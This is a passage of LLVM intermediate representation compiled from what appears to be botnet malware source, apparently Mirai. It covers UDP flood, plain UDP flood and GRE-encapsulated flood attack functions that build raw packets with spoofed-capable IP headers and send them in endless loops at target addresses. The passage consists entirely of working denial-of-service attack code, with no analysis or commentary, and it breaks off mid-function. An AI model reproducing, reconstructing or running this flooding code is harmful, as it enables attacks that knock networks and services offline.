  %95 = getelementptr inbounds i8, i8* %80, i64 8
  store i8 %15, i8* %95, align 4
  %96 = call zeroext i16 @htons(i16 zeroext 16384) #12
  %97 = getelementptr inbounds i8, i8* %80, i64 6
  %98 = bitcast i8* %97 to i16*
  store i16 %96, i16* %98, align 2
  %99 = getelementptr inbounds i8, i8* %80, i64 9
  store i8 17, i8* %99, align 1
  %100 = load i32, i32* @LOCAL_ADDR, align 4
  %101 = getelementptr inbounds i8, i8* %80, i64 12
  %102 = bitcast i8* %101 to i32*
  store i32 %100, i32* %102, align 4
  %103 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %81, i32 1
  %104 = load i32, i32* %103, align 4
  %105 = getelementptr inbounds i8, i8* %80, i64 16
  %106 = bitcast i8* %105 to i32*
  store i32 %104, i32* %106, align 4
  %107 = call zeroext i16 @htons(i16 zeroext %19) #12
  %108 = bitcast i8* %83 to i16*
  store i16 %107, i16* %108, align 2
  %109 = call zeroext i16 @htons(i16 zeroext %21) #12
  %110 = getelementptr inbounds i8, i8* %80, i64 22
  %111 = bitcast i8* %110 to i16*
  store i16 %109, i16* %111, align 2
  %112 = add i16 %87, 12
  %113 = call zeroext i16 @htons(i16 zeroext %112) #12
  %114 = getelementptr inbounds i8, i8* %80, i64 24
  %115 = bitcast i8* %114 to i16*
  store i16 %113, i16* %115, align 2
  %116 = bitcast i8* %84 to i32*
  store i32 -1, i32* %116, align 4
  %117 = getelementptr inbounds i8, i8* %80, i64 32
  call void @util_memcpy(i8* %117, i8* %22, i32 %86) #11
  %118 = load i32, i32* %5, align 4
  %119 = add nsw i32 %118, 1
  store i32 %119, i32* %5, align 4
  %120 = icmp slt i32 %119, %29
  br i1 %120, label %.lr.ph73.split, label %.preheader.loopexit89

.loopexit.loopexit:                               ; preds = %146
  br label %.loopexit.backedge

.loopexit.loopexit88:                             ; preds = %192
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %30, label %.loopexit.backedge, label %.lr.ph

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit, %.loopexit.loopexit88
  br label %.loopexit

.lr.ph:                                           ; preds = %.loopexit
  br i1 %74, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %146
  %121 = phi i32 [ %167, %146 ], [ 0, %.lr.ph.split.us.preheader ]
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i8*, i8** %9, i64 %122
  %124 = load i8*, i8** %123, align 8
  %125 = bitcast i8* %124 to %struct.iphdr*
  %126 = getelementptr inbounds i8, i8* %124, i64 20
  %127 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %122, i32 2
  %128 = load i8, i8* %127, align 4
  %129 = icmp ult i8 %128, 32
  br i1 %129, label %130, label %137

; <label>:130:                                    ; preds = %.lr.ph.split.us
  %131 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %122, i32 1
  %132 = load i32, i32* %131, align 4
  %133 = call i32 @ntohl(i32 %132) #12
  %134 = call i32 @htonl(i32 %133) #12
  %135 = getelementptr inbounds i8, i8* %124, i64 16
  %136 = bitcast i8* %135 to i32*
  store i32 %134, i32* %136, align 4
  br label %137

; <label>:137:                                    ; preds = %.lr.ph.split.us, %130
  %138 = getelementptr inbounds i8, i8* %124, i64 4
  %139 = bitcast i8* %138 to i16*
  store i16 0, i16* %139, align 4
  br i1 %76, label %140, label %142

; <label>:140:                                    ; preds = %137
  %141 = bitcast i8* %126 to i16*
  store i16 0, i16* %141, align 2
  br label %142

; <label>:142:                                    ; preds = %140, %137
  %143 = getelementptr inbounds i8, i8* %124, i64 22
  %144 = bitcast i8* %143 to i16*
  br i1 %78, label %145, label %._crit_edge77

._crit_edge77:                                    ; preds = %142
  %.pre80 = load i16, i16* %144, align 2
  br label %146

; <label>:145:                                    ; preds = %142
  store i16 0, i16* %144, align 2
  br label %146

; <label>:146:                                    ; preds = %._crit_edge77, %145
  %147 = phi i16 [ %.pre80, %._crit_edge77 ], [ 0, %145 ]
  %148 = getelementptr inbounds i8, i8* %124, i64 10
  %149 = bitcast i8* %148 to i16*
  store i16 0, i16* %149, align 2
  %150 = bitcast i8* %124 to i16*
  %151 = call zeroext i16 @checksum_generic(i16* %150, i32 20)
  store i16 %151, i16* %149, align 2
  %152 = getelementptr inbounds i8, i8* %124, i64 26
  %153 = bitcast i8* %152 to i16*
  store i16 0, i16* %153, align 2
  %154 = getelementptr inbounds i8, i8* %124, i64 24
  %155 = bitcast i8* %154 to i16*
  %156 = load i16, i16* %155, align 2
  %157 = load i32, i32* %6, align 4
  %158 = add i32 %157, 12
  %159 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %125, i8* nonnull %126, i16 zeroext %156, i32 %158)
  store i16 %159, i16* %153, align 2
  %160 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %122, i32 0, i32 1
  store i16 %147, i16* %160, align 2
  %161 = sext i32 %157 to i64
  %162 = add nsw i64 %161, 32
  %163 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %122, i32 0
  %164 = bitcast %struct.sockaddr_in* %163 to %struct.sockaddr*
  %165 = call i64 @sendto(i32 %23, i8* nonnull %124, i64 %162, i32 16384, %struct.sockaddr* %164, i32 16) #11
  %166 = load i32, i32* %5, align 4
  %167 = add nsw i32 %166, 1
  store i32 %167, i32* %5, align 4
  %168 = icmp slt i32 %167, %29
  br i1 %168, label %.lr.ph.split.us, label %.loopexit.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %192
  %169 = phi i32 [ %213, %192 ], [ 0, %.lr.ph.split.preheader ]
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds i8*, i8** %9, i64 %170
  %172 = load i8*, i8** %171, align 8
  %173 = bitcast i8* %172 to %struct.iphdr*
  %174 = getelementptr inbounds i8, i8* %172, i64 20
  %175 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %170, i32 2
  %176 = load i8, i8* %175, align 4
  %177 = icmp ult i8 %176, 32
  br i1 %177, label %178, label %185

; <label>:178:                                    ; preds = %.lr.ph.split
  %179 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %170, i32 1
  %180 = load i32, i32* %179, align 4
  %181 = call i32 @ntohl(i32 %180) #12
  %182 = call i32 @htonl(i32 %181) #12
  %183 = getelementptr inbounds i8, i8* %172, i64 16
  %184 = bitcast i8* %183 to i32*
  store i32 %182, i32* %184, align 4
  br label %185

; <label>:185:                                    ; preds = %.lr.ph.split, %178
  br i1 %76, label %186, label %188

; <label>:186:                                    ; preds = %185
  %187 = bitcast i8* %174 to i16*
  store i16 0, i16* %187, align 2
  br label %188

; <label>:188:                                    ; preds = %186, %185
  %189 = getelementptr inbounds i8, i8* %172, i64 22
  %190 = bitcast i8* %189 to i16*
  br i1 %78, label %191, label %._crit_edge

._crit_edge:                                      ; preds = %188
  %.pre = load i16, i16* %190, align 2
  br label %192

; <label>:191:                                    ; preds = %188
  store i16 0, i16* %190, align 2
  br label %192

; <label>:192:                                    ; preds = %._crit_edge, %191
  %193 = phi i16 [ %.pre, %._crit_edge ], [ 0, %191 ]
  %194 = getelementptr inbounds i8, i8* %172, i64 10
  %195 = bitcast i8* %194 to i16*
  store i16 0, i16* %195, align 2
  %196 = bitcast i8* %172 to i16*
  %197 = call zeroext i16 @checksum_generic(i16* %196, i32 20)
  store i16 %197, i16* %195, align 2
  %198 = getelementptr inbounds i8, i8* %172, i64 26
  %199 = bitcast i8* %198 to i16*
  store i16 0, i16* %199, align 2
  %200 = getelementptr inbounds i8, i8* %172, i64 24
  %201 = bitcast i8* %200 to i16*
  %202 = load i16, i16* %201, align 2
  %203 = load i32, i32* %6, align 4
  %204 = add i32 %203, 12
  %205 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %173, i8* nonnull %174, i16 zeroext %202, i32 %204)
  store i16 %205, i16* %199, align 2
  %206 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %170, i32 0, i32 1
  store i16 %193, i16* %206, align 2
  %207 = sext i32 %203 to i64
  %208 = add nsw i64 %207, 32
  %209 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %170, i32 0
  %210 = bitcast %struct.sockaddr_in* %209 to %struct.sockaddr*
  %211 = call i64 @sendto(i32 %23, i8* nonnull %172, i64 %208, i32 16384, %struct.sockaddr* %210, i32 16) #11
  %212 = load i32, i32* %5, align 4
  %213 = add nsw i32 %212, 1
  store i32 %213, i32* %5, align 4
  %214 = icmp slt i32 %213, %29
  br i1 %214, label %.lr.ph.split, label %.loopexit.loopexit88

; <label>:215:                                    ; preds = %4, %71
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpplain(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #11
  %8 = bitcast i8* %7 to i8**
  %9 = tail call noalias i8* @calloc(i64 %6, i64 4) #11
  %10 = bitcast i8* %9 to i32*
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 512)
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = bitcast %struct.sockaddr_in* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %17, i8 0, i64 16, i32 4, i1 false)
  %18 = and i32 %13, 65535
  %19 = icmp eq i32 %18, 65535
  br i1 %19, label %23, label %20

; <label>:20:                                     ; preds = %4
  %21 = trunc i32 %13 to i16
  %22 = tail call zeroext i16 @htons(i16 zeroext %21) #12
  br label %23

; <label>:23:                                     ; preds = %4, %20
  %.058 = phi i16 [ %22, %20 ], [ 0, %4 ]
  %24 = zext i8 %0 to i32
  %25 = icmp eq i8 %0, 0
  br i1 %25, label %.preheader.split.preheader, label %.lr.ph65

.preheader.split.preheader:                       ; preds = %.preheader, %23
  br label %.preheader.split

.lr.ph65:                                         ; preds = %23
  %26 = and i32 %11, 65535
  %27 = icmp eq i32 %26, 65535
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %31 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %32 = zext i8 %0 to i64
  br i1 %27, label %.lr.ph65.split.us.preheader, label %.lr.ph65.split.preheader

.lr.ph65.split.preheader:                         ; preds = %.lr.ph65
  br label %.lr.ph65.split

.lr.ph65.split.us.preheader:                      ; preds = %.lr.ph65
  br label %.lr.ph65.split.us

.lr.ph65.split.us:                                ; preds = %.lr.ph65.split.us.preheader, %51
  %indvars.iv = phi i64 [ %indvars.iv.next, %51 ], [ 0, %.lr.ph65.split.us.preheader ]
  %33 = call noalias i8* @calloc(i64 65535, i64 1) #11
  %34 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %33, i8** %34, align 8
  %35 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv
  %36 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 1
  store i16 0, i16* %36, align 2
  %37 = call i32 @socket(i32 2, i32 2, i32 17) #11
  %38 = getelementptr inbounds i32, i32* %10, i64 %indvars.iv
  store i32 %37, i32* %38, align 4
  %39 = icmp eq i32 %37, -1
  br i1 %39, label %.us-lcssa.us.loopexit, label %40

; <label>:40:                                     ; preds = %.lr.ph65.split.us
  store i16 2, i16* %28, align 4
  store i16 %.058, i16* %29, align 2
  store i32 0, i32* %30, align 4
  %41 = call i32 @bind(i32 %37, %struct.sockaddr* nonnull %31, i32 16) #11
  %42 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 2
  %43 = load i8, i8* %42, align 4
  %44 = icmp ult i8 %43, 32
  br i1 %44, label %45, label %51

; <label>:45:                                     ; preds = %40
  %46 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %47 = load i32, i32* %46, align 4
  %48 = call i32 @ntohl(i32 %47) #12
  %49 = call i32 @htonl(i32 %48) #12
  %50 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 2, i32 0
  store i32 %49, i32* %50, align 4
  br label %51

; <label>:51:                                     ; preds = %45, %40
  %52 = bitcast %struct.attack_target* %35 to %struct.sockaddr*
  %53 = call i32 @connect(i32 %37, %struct.sockaddr* %52, i32 16) #11
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %54 = icmp slt i64 %indvars.iv.next, %32
  br i1 %54, label %.lr.ph65.split.us, label %.preheader.loopexit

.preheader.loopexit:                              ; preds = %51
  br label %.preheader

.preheader.loopexit78:                            ; preds = %92
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit78, %.preheader.loopexit
  %55 = icmp eq i8 %16, 0
  %.mask = and i32 %14, 65535
  %56 = zext i32 %.mask to i64
  br i1 %25, label %.preheader.split.preheader, label %.preheader.split.us

.preheader.split.us:                              ; preds = %.preheader
  br i1 %55, label %.lr.ph.split.us.us.preheader, label %.lr.ph..lr.ph.split_crit_edge.us.preheader

.lr.ph..lr.ph.split_crit_edge.us.preheader.loopexit: ; preds = %.lr.ph.split.us.us
  br label %.lr.ph..lr.ph.split_crit_edge.us.preheader

.lr.ph..lr.ph.split_crit_edge.us.preheader:       ; preds = %.lr.ph..lr.ph.split_crit_edge.us.preheader.loopexit, %.preheader.split.us
  %.not = xor i1 %55, true
  br label %.lr.ph..lr.ph.split_crit_edge.us

.lr.ph..lr.ph.split_crit_edge.us:                 ; preds = %.lr.ph..lr.ph.split_crit_edge.us.preheader, %.lr.ph..lr.ph.split_crit_edge.us
  %.160.us61 = phi i32 [ %.mux67, %.lr.ph..lr.ph.split_crit_edge.us ], [ 0, %.lr.ph..lr.ph.split_crit_edge.us.preheader ]
  %57 = sext i32 %.160.us61 to i64
  %58 = getelementptr inbounds i8*, i8** %8, i64 %57
  %59 = load i8*, i8** %58, align 8
  call void @rand_str(i8* %59, i32 %.mask)
  %60 = getelementptr inbounds i32, i32* %10, i64 %57
  %61 = load i32, i32* %60, align 4
  %62 = call i64 @send(i32 %61, i8* %59, i64 %56, i32 16384) #11
  %63 = add nsw i32 %.160.us61, 1
  %64 = icmp slt i32 %63, %24
  %brmerge66 = or i1 %64, %.not
  %.mux67 = select i1 %64, i32 %63, i32 0
  br i1 %brmerge66, label %.lr.ph..lr.ph.split_crit_edge.us, label %.lr.ph.split.us.us.preheader.loopexit

.lr.ph.split.us.us.preheader.loopexit:            ; preds = %.lr.ph..lr.ph.split_crit_edge.us
  br label %.lr.ph.split.us.us.preheader

.lr.ph.split.us.us.preheader:                     ; preds = %.lr.ph.split.us.us.preheader.loopexit, %.preheader.split.us
  br label %.lr.ph.split.us.us

.lr.ph.split.us.us:                               ; preds = %.lr.ph.split.us.us.preheader, %.lr.ph.split.us.us
  %.160.us.us = phi i32 [ %.mux, %.lr.ph.split.us.us ], [ 0, %.lr.ph.split.us.us.preheader ]
  %65 = sext i32 %.160.us.us to i64
  %66 = getelementptr inbounds i8*, i8** %8, i64 %65
  %67 = load i8*, i8** %66, align 8
  %68 = getelementptr inbounds i32, i32* %10, i64 %65
  %69 = load i32, i32* %68, align 4
  %70 = call i64 @send(i32 %69, i8* %67, i64 %56, i32 16384) #11
  %71 = add nsw i32 %.160.us.us, 1
  %72 = icmp slt i32 %71, %24
  %brmerge = or i1 %72, %55
  %.mux = select i1 %72, i32 %71, i32 0
  br i1 %brmerge, label %.lr.ph.split.us.us, label %.lr.ph..lr.ph.split_crit_edge.us.preheader.loopexit

.lr.ph65.split:                                   ; preds = %.lr.ph65.split.preheader, %92
  %indvars.iv70 = phi i64 [ %indvars.iv.next71, %92 ], [ 0, %.lr.ph65.split.preheader ]
  %73 = call noalias i8* @calloc(i64 65535, i64 1) #11
  %74 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv70
  store i8* %73, i8** %74, align 8
  %75 = call zeroext i16 @htons(i16 zeroext %12) #12
  %76 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70
  %77 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70, i32 0, i32 1
  store i16 %75, i16* %77, align 2
  %78 = call i32 @socket(i32 2, i32 2, i32 17) #11
  %79 = getelementptr inbounds i32, i32* %10, i64 %indvars.iv70
  store i32 %78, i32* %79, align 4
  %80 = icmp eq i32 %78, -1
  br i1 %80, label %.us-lcssa.us.loopexit77, label %81

.us-lcssa.us.loopexit:                            ; preds = %.lr.ph65.split.us
  br label %.us-lcssa.us

.us-lcssa.us.loopexit77:                          ; preds = %.lr.ph65.split
  br label %.us-lcssa.us

.us-lcssa.us:                                     ; preds = %.us-lcssa.us.loopexit77, %.us-lcssa.us.loopexit
  ret void

; <label>:81:                                     ; preds = %.lr.ph65.split
  store i16 2, i16* %28, align 4
  store i16 %.058, i16* %29, align 2
  store i32 0, i32* %30, align 4
  %82 = call i32 @bind(i32 %78, %struct.sockaddr* nonnull %31, i32 16) #11
  %83 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70, i32 2
  %84 = load i8, i8* %83, align 4
  %85 = icmp ult i8 %84, 32
  br i1 %85, label %86, label %92

; <label>:86:                                     ; preds = %81
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70, i32 1
  %88 = load i32, i32* %87, align 4
  %89 = call i32 @ntohl(i32 %88) #12
  %90 = call i32 @htonl(i32 %89) #12
  %91 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv70, i32 0, i32 2, i32 0
  store i32 %90, i32* %91, align 4
  br label %92

; <label>:92:                                     ; preds = %86, %81
  %93 = bitcast %struct.attack_target* %76 to %struct.sockaddr*
  %94 = call i32 @connect(i32 %78, %struct.sockaddr* %93, i32 16) #11
  %indvars.iv.next71 = add nuw nsw i64 %indvars.iv70, 1
  %95 = icmp slt i64 %indvars.iv.next71, %32
  br i1 %95, label %.lr.ph65.split, label %.preheader.loopexit78

.preheader.split:                                 ; preds = %.preheader.split.preheader, %.preheader.split
  br label %.preheader.split
}

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_ip(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #11
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 512)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %23 = trunc i32 %22 to i8
  %24 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 19, i32 0)
  %25 = trunc i32 %24 to i8
  %26 = load i32, i32* @LOCAL_ADDR, align 4
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %26)
  %28 = tail call i32 @socket(i32 2, i32 3, i32 6) #11
  %29 = icmp eq i32 %28, -1
  br i1 %29, label %284, label %30

; <label>:30:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %31 = bitcast i32* %5 to i8*
  %32 = call i32 @setsockopt(i32 %28, i32 0, i32 3, i8* nonnull %31, i32 4) #11
  %33 = icmp eq i32 %32, -1
  br i1 %33, label %92, label %.preheader125

.preheader125:                                    ; preds = %30
  store i32 0, i32* %5, align 4
  %34 = zext i8 %0 to i32
  %35 = icmp eq i8 %0, 0
  %.pre135 = sext i32 %21 to i64
  %.pre136 = add nsw i64 %.pre135, 52
  br i1 %35, label %.preheader, label %.lr.ph127

.lr.ph127:                                        ; preds = %.preheader125
  %36 = trunc i64 %.pre136 to i16
  %37 = icmp eq i8 %16, 0
  %38 = add nsw i64 %.pre135, 28
  %39 = trunc i64 %38 to i16
  %40 = xor i16 %12, -1
  %41 = icmp eq i8 %25, 0
  %42 = add nsw i64 %.pre135, 8
  %43 = trunc i64 %42 to i16
  %44 = zext i8 %0 to i64
  br i1 %37, label %.lr.ph127.split.preheader, label %.lr.ph127.split.us.preheader

.lr.ph127.split.us.preheader:                     ; preds = %.lr.ph127
  br label %.lr.ph127.split.us

.lr.ph127.split.preheader:                        ; preds = %.lr.ph127
  br label %.lr.ph127.split

.lr.ph127.split.us:                               ; preds = %.lr.ph127.split.us.preheader, %.lr.ph127.split.us
  %indvars.iv132 = phi i64 [ %indvars.iv.next133, %.lr.ph127.split.us ], [ 0, %.lr.ph127.split.us.preheader ]
  %45 = call noalias i8* @calloc(i64 1510, i64 8) #11
  %46 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv132
  store i8* %45, i8** %46, align 8
  %47 = getelementptr inbounds i8, i8* %45, i64 24
  %48 = getelementptr inbounds i8, i8* %45, i64 44
  store i8 69, i8* %45, align 4
  %49 = getelementptr inbounds i8, i8* %45, i64 1
  store i8 %10, i8* %49, align 1
  %50 = call zeroext i16 @htons(i16 zeroext %36) #12
  %51 = getelementptr inbounds i8, i8* %45, i64 2
  %52 = bitcast i8* %51 to i16*
  store i16 %50, i16* %52, align 2
  %53 = call zeroext i16 @htons(i16 zeroext %12) #12
  %54 = getelementptr inbounds i8, i8* %45, i64 4
  %55 = bitcast i8* %54 to i16*
  store i16 %53, i16* %55, align 4
  %56 = getelementptr inbounds i8, i8* %45, i64 8
  store i8 %14, i8* %56, align 4
  %57 = call zeroext i16 @htons(i16 zeroext 16384) #12
  %58 = getelementptr inbounds i8, i8* %45, i64 6
  %59 = bitcast i8* %58 to i16*
  store i16 %57, i16* %59, align 2
  %60 = getelementptr inbounds i8, i8* %45, i64 9
  store i8 47, i8* %60, align 1
  %61 = getelementptr inbounds i8, i8* %45, i64 12
  %62 = bitcast i8* %61 to i32*
  store i32 %27, i32* %62, align 4
  %63 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv132, i32 1
  %64 = load i32, i32* %63, align 4
  %65 = getelementptr inbounds i8, i8* %45, i64 16
  %66 = bitcast i8* %65 to i32*
  store i32 %64, i32* %66, align 4
  %67 = call zeroext i16 @htons(i16 zeroext 2048) #12
  %68 = getelementptr inbounds i8, i8* %45, i64 22
  %69 = bitcast i8* %68 to i16*
  store i16 %67, i16* %69, align 2
  store i8 69, i8* %47, align 4
  %70 = getelementptr inbounds i8, i8* %45, i64 25
  store i8 %10, i8* %70, align 1
  %71 = call zeroext i16 @htons(i16 zeroext %39) #12
  %72 = getelementptr inbounds i8, i8* %45, i64 26
  %73 = bitcast i8* %72 to i16*
  store i16 %71, i16* %73, align 2
  %74 = call zeroext i16 @htons(i16 zeroext %40) #12
  %75 = getelementptr inbounds i8, i8* %45, i64 28
  %76 = bitcast i8* %75 to i16*
  store i16 %74, i16* %76, align 4
  %77 = getelementptr inbounds i8, i8* %45, i64 32
  store i8 %14, i8* %77, align 4
  %78 = getelementptr inbounds i8, i8* %45, i64 30
  %79 = bitcast i8* %78 to i16*
  store i16 %57, i16* %79, align 2
  %80 = getelementptr inbounds i8, i8* %45, i64 33
  store i8 17, i8* %80, align 1
  %. = select i1 %41, i32 1023, i32 %64
  %81 = getelementptr inbounds i8, i8* %45, i64 40
  %82 = bitcast i8* %81 to i32*
  store i32 %., i32* %82, align 4
  %83 = call zeroext i16 @htons(i16 zeroext %18) #12
  %84 = bitcast i8* %48 to i16*
  store i16 %83, i16* %84, align 2
  %85 = call zeroext i16 @htons(i16 zeroext %20) #12
  %86 = getelementptr inbounds i8, i8* %45, i64 46
  %87 = bitcast i8* %86 to i16*
  store i16 %85, i16* %87, align 2
  %88 = call zeroext i16 @htons(i16 zeroext %43) #12
  %89 = getelementptr inbounds i8, i8* %45, i64 48
  %90 = bitcast i8* %89 to i16*
  store i16 %88, i16* %90, align 2
  %indvars.iv.next133 = add nsw i64 %indvars.iv132, 1
  %91 = icmp slt i64 %indvars.iv.next133, %44
  br i1 %91, label %.lr.ph127.split.us, label %..preheader_crit_edge.loopexit144

; <label>:92:                                     ; preds = %30
  %93 = call i32 @close(i32 %28) #11
  br label %284

..preheader_crit_edge.loopexit:                   ; preds = %.lr.ph127.split
  br label %..preheader_crit_edge

..preheader_crit_edge.loopexit144:                ; preds = %.lr.ph127.split.us
  br label %..preheader_crit_edge

..preheader_crit_edge:                            ; preds = %..preheader_crit_edge.loopexit144, %..preheader_crit_edge.loopexit
  %.lcssa128.in = phi i64 [ %indvars.iv.next, %..preheader_crit_edge.loopexit ], [ %indvars.iv.next133, %..preheader_crit_edge.loopexit144 ]
  %.lcssa128 = trunc i64 %.lcssa128.in to i32
  store i32 %.lcssa128, i32* %5, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader125, %..preheader_crit_edge
  %94 = icmp eq i32 %27, -1
  %95 = and i32 %11, 65535
  %96 = icmp eq i32 %95, 65535
  %97 = and i32 %17, 65535
  %98 = icmp eq i32 %97, 65535
  %99 = and i32 %19, 65535
  %100 = icmp eq i32 %99, 65535
  %101 = icmp eq i8 %25, 0
  %102 = icmp eq i8 %23, 0
  %103 = add i32 %21, 8
  br label %.loopexit

.lr.ph127.split:                                  ; preds = %.lr.ph127.split.preheader, %.lr.ph127.split
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph127.split ], [ 0, %.lr.ph127.split.preheader ]
  %104 = call noalias i8* @calloc(i64 1510, i64 8) #11
  %105 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %104, i8** %105, align 8
  %106 = getelementptr inbounds i8, i8* %104, i64 24
  %107 = getelementptr inbounds i8, i8* %104, i64 44
  store i8 69, i8* %104, align 4
  %108 = getelementptr inbounds i8, i8* %104, i64 1
  store i8 %10, i8* %108, align 1
  %109 = call zeroext i16 @htons(i16 zeroext %36) #12
  %110 = getelementptr inbounds i8, i8* %104, i64 2
  %111 = bitcast i8* %110 to i16*
  store i16 %109, i16* %111, align 2
  %112 = call zeroext i16 @htons(i16 zeroext %12) #12
  %113 = getelementptr inbounds i8, i8* %104, i64 4
  %114 = bitcast i8* %113 to i16*
  store i16 %112, i16* %114, align 4
  %115 = getelementptr inbounds i8, i8* %104, i64 8
  store i8 %14, i8* %115, align 4
  %116 = getelementptr inbounds i8, i8* %104, i64 9
  store i8 47, i8* %116, align 1
  %117 = getelementptr inbounds i8, i8* %104, i64 12
  %118 = bitcast i8* %117 to i32*
  store i32 %27, i32* %118, align 4
  %119 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %120 = load i32, i32* %119, align 4
  %121 = getelementptr inbounds i8, i8* %104, i64 16
  %122 = bitcast i8* %121 to i32*
  store i32 %120, i32* %122, align 4
  %123 = call zeroext i16 @htons(i16 zeroext 2048) #12
  %124 = getelementptr inbounds i8, i8* %104, i64 22
  %125 = bitcast i8* %124 to i16*
  store i16 %123, i16* %125, align 2
  store i8 69, i8* %106, align 4
  %126 = getelementptr inbounds i8, i8* %104, i64 25
  store i8 %10, i8* %126, align 1
  %127 = call zeroext i16 @htons(i16 zeroext %39) #12
  %128 = getelementptr inbounds i8, i8* %104, i64 26
  %129 = bitcast i8* %128 to i16*
  store i16 %127, i16* %129, align 2
  %130 = call zeroext i16 @htons(i16 zeroext %40) #12
  %131 = getelementptr inbounds i8, i8* %104, i64 28
  %132 = bitcast i8* %131 to i16*
  store i16 %130, i16* %132, align 4
  %133 = getelementptr inbounds i8, i8* %104, i64 32
  store i8 %14, i8* %133, align 4
  %134 = getelementptr inbounds i8, i8* %104, i64 33
  store i8 17, i8* %134, align 1
  %.140 = select i1 %41, i32 1023, i32 %120
